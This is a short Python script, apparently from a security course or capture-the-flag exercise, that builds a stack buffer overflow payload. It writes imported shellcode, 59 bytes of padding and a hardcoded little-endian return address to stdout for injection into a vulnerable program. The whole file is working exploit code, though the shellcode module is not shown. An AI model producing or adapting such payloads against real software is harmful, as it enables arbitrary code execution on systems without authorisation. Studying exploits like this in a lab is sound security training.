from shellcode import shellcode
import struct
import sys

payload = b'a'*59
payload2 = shellcode
payload3 = struct.pack("<I", 0xbffea93c)
value = payload2+payload+payload3
sys.stdout.buffer.write(payload2+payload+payload3)
